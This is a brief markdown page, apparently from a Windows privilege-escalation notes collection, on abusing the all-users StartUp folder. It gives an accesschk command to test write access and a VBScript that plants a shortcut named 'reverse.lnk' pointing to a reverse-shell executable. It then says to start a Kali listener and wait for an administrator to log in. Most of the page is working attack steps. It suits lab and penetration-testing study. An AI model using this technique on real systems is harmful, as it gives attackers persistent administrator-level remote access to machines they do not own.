---
title: Startup
parent: Method (Windows)
layout: default
nav_order: 7
---

Will only be triggered when an administrator or equivalent logins.

1. Check if we have access: `accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`
2. Use this script below to create a shortcut (must be shortcut!)
3. Run the script using: `cscript CreateShortcut.vbs`
4. Start listener on Kali and wait until admin logins

CreateShortcut.vbs
```
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start
Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```